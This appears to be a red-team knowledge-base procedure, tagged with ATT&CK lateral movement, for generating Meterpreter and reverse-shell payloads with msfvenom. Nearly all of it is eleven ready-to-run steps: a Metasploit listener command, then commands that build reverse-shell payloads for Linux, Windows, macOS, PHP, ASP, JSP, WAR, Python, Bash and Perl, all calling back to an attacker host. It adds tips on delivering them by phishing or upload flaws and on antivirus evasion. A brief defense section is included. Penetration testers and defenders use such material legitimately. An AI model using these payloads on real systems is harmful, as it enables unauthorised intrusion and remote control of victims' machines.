---
id: 7dabd646-1784-4a6b-ade3-a3b4130a514d
name: Meterpreter-Payload-Generation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:21.292947+00:00'
updated_at: '2023-04-10T20:25:02.562278+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Generate a meterpreter]]'
  - '[[tags/Metasploit]]'
  - '[[tags/Meterpreter - Basic]]'
  - payload-generation
  - reverse-shell
commands:
  - '[[commands/msfvenom-generate-linux-x86-meterpreter-reverse-tcp-elf]]'
  - '[[commands/msfvenom-generate-windows-meterpreter-reverse-tcp-exe]]'
  - '[[commands/msfvenom-generate-osx-x86-shell-reverse-tcp-macho]]'
  - '[[commands/msfvenom-generate-php-meterpreter-reverse-tcp-raw]]'
  - '[[commands/msfvenom-generate-windows-meterpreter-reverse-tcp-asp]]'
  - '[[commands/msfvenom-generate-java-jsp-shell-reverse-tcp-raw]]'
  - '[[commands/msfvenom-generate-java-jsp-shell-reverse-tcp-war]]'
  - '[[commands/msfvenom-generate-cmd-unix-reverse-python-raw]]'
  - '[[commands/msfvenom-generate-cmd-unix-reverse-bash-raw]]'
  - '[[commands/msfvenom-generate-cmd-unix-reverse-perl-raw]]'
platforms:
  - Linux
  - Windows
  - macOS
  - PHP
  - Java
  - Unix
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Meterpreter-Payload-Generation

## Summary

This procedure uses the msfvenom tool from the Metasploit Framework to generate Meterpreter payloads for various platforms, enabling remote code execution and post-exploitation capabilities on target systems. It covers Linux, Windows, macOS, PHP, Java, and Unix-based reverse shells, allowing attackers to establish persistent connections back to a listener for command execution, file transfer, and network pivoting.

## Description

Meterpreter is an advanced payload in the Metasploit Framework that provides a dynamic, extensible environment for post-exploitation operations. This procedure focuses on generating reverse TCP Meterpreter payloads tailored to different operating systems and environments, such as executable files for Windows and Linux, Mach-O binaries for macOS, and scripted payloads for web technologies like PHP and Java. These payloads connect back to an attacker-controlled host (specified by LHOST and LPORT), bypassing firewalls and enabling lateral movement. The technique is commonly used after initial access to escalate control or maintain persistence. Prerequisites include a running Metasploit listener (e.g., via msfconsole with multi/handler) to catch the incoming connections. Each generated payload can be delivered via phishing, exploit modules, or file uploads, depending on the target.

## Requirements

1. Metasploit Framework installed and accessible (see [[tools/Metasploit-Framework]] for installation).
2. Knowledge of the target system's architecture (e.g., x86 for Linux/Windows) and operating system to select the appropriate payload.
3. Attacker machine with a public or reachable IP address for LHOST and an open port for LPORT (e.g., 4444).
4. Basic command-line proficiency in Bash for executing msfvenom.
5. A wordlist or encoding options if evasion is needed (optional for basic generation).

## Defense

- Keep systems patched against known vulnerabilities that allow payload delivery (e.g., via CVE monitoring).
- Implement endpoint detection and response (EDR) tools to scan for suspicious executables and network connections to unusual IPs/ports.
- Use application whitelisting to prevent execution of unsigned binaries or scripts from untrusted sources.
- Monitor for anomalous outbound connections (e.g., via firewall logs or SIEM rules for reverse shell patterns).
- Enable PowerShell logging and script block auditing on Windows to detect Meterpreter-like behaviors.

## Objectives

1. Generate platform-specific Meterpreter payloads ready for deployment in penetration testing or red team exercises.
2. Establish a reverse connection from the target to the attacker's listener for interactive shell access.
3. Enable post-exploitation actions like file upload/download, keylogging, and privilege escalation via the Meterpreter session.

## Instructions

### Step 1: Prepare Metasploit Listener

**Context**: Before generating payloads, set up a listener in Metasploit to handle incoming connections from the payloads. This ensures the generated shells can connect successfully.

Use msfconsole to start a multi/handler:

```bash
msfconsole -q -x "use multi/handler; set payload generic/shell_reverse_tcp; set LHOST 10.10.10.110; set LPORT 4242; exploit -j"
```

> This command launches Metasploit in quiet mode, selects the handler payload, configures the IP and port, and starts the listener in the background. Expected output includes "[*] Started reverse TCP handler on 10.10.10.110:4242" confirming the listener is active.

If the connection succeeds later, you'll see a new session open in msfconsole.

### Step 2: Generate Linux x86 Meterpreter Reverse TCP Payload

**Context**: Create an ELF executable for Linux x86 systems, which can be executed directly on the target for a Meterpreter session. This is useful for Unix-like servers vulnerable to RCE.

**Command** ([[commands/msfvenom-generate-linux-x86-meterpreter-reverse-tcp-elf]]):

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
```

> This generates a reverse Meterpreter payload as an ELF binary. Expected output is a file 'shell.elf' (typically ~30-50 KB). Verify with 'ls -la shell.elf' to confirm creation. Transfer and execute on the target (e.g., chmod +x shell.elf; ./shell.elf) to trigger the connection.

### Step 3: Generate Windows Meterpreter Reverse TCP Payload

**Context**: Produce an EXE for Windows targets, ideal for delivery via social engineering or drive-by downloads, establishing a Meterpreter shell for Windows-specific post-exploitation.

**Command** ([[commands/msfvenom-generate-windows-meterpreter-reverse-tcp-exe]]):

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
```

> This creates a Windows executable payload. Expected output is 'shell.exe' (~50-100 KB). Check with 'file shell.exe' or size. On the target, run it to connect back; use encoding (e.g., -e x86/shikata_ga_nai) if AV detection is an issue.

### Step 4: Generate macOS x86 Shell Reverse TCP Payload

**Context**: For macOS targets, generate a Mach-O binary that provides a basic reverse shell, which can be upgraded to Meterpreter if needed. Useful for Apple devices in enterprise environments.

**Command** ([[commands/msfvenom-generate-osx-x86-shell-reverse-tcp-macho]]):

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
```

> Outputs a Mach-O file 'shell.macho'. Expected: File created (~20-40 KB). Execute on target with 'chmod +x shell.macho; ./shell.macho' for shell access.

### Step 5: Generate PHP Meterpreter Reverse TCP Payload

**Context**: For web servers running PHP, this creates a raw payload wrapped in PHP tags, suitable for upload vulnerabilities or webshell deployment.

**Command** ([[commands/msfvenom-generate-php-meterpreter-reverse-tcp-raw]]):

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

> This generates and wraps the payload in PHP syntax. Expected: 'shell.php' file with <?php at the start. Test by accessing via browser or curl; connection should hit the listener.

### Step 6: Generate Windows ASP Meterpreter Reverse TCP Payload

**Context**: Targets IIS servers with ASP support, generating a webshell-like payload for remote execution on Windows web apps.

**Command** ([[commands/msfvenom-generate-windows-meterpreter-reverse-tcp-asp]]):

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
```

> Creates 'shell.asp'. Expected: File with ASP code (~5-10 KB). Upload to target and request to trigger.

### Step 7: Generate Java JSP Shell Reverse TCP Payload

**Context**: For Java web apps (e.g., Tomcat), this raw JSP payload acts as a reverse shell, injectable via file upload flaws.

**Command** ([[commands/msfvenom-generate-java-jsp-shell-reverse-tcp-raw]]):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
```

> Outputs 'shell.jsp'. Expected: JSP file ready for deployment. Access via HTTP to connect.

### Step 8: Generate Java WAR Shell Reverse TCP Payload

**Context**: WAR format for deploying as a full web archive in Java containers, providing persistent shell access.

**Command** ([[commands/msfvenom-generate-java-jsp-shell-reverse-tcp-war]]):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
```

> Creates 'shell.war'. Expected: Archive file (~10-20 KB). Deploy to app server.

### Step 9: Generate Unix Python Reverse Shell

**Context**: Python-based reverse shell for Unix systems where Python is available, as a fallback non-Meterpreter option.

**Command** ([[commands/msfvenom-generate-cmd-unix-reverse-python-raw]]):

```bash
msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
```

> Generates 'shell.py'. Expected: Python script. Run with 'python shell.py' on target.

### Step 10: Generate Unix Bash Reverse Shell

**Context**: Simple Bash reverse shell for Unix environments, quick to execute without additional interpreters.

**Command** ([[commands/msfvenom-generate-cmd-unix-reverse-bash-raw]]):

```bash
msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
```

> Outputs 'shell.sh'. Expected: Script file. Execute with 'bash shell.sh'.

### Step 11: Generate Unix Perl Reverse Shell

**Context**: Perl payload for systems with Perl installed, providing another lightweight reverse shell option.

**Command** ([[commands/msfvenom-generate-cmd-unix-reverse-perl-raw]]):

```bash
msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
```

> Creates 'shell.pl'. Expected: Perl script. Run with 'perl shell.pl'.
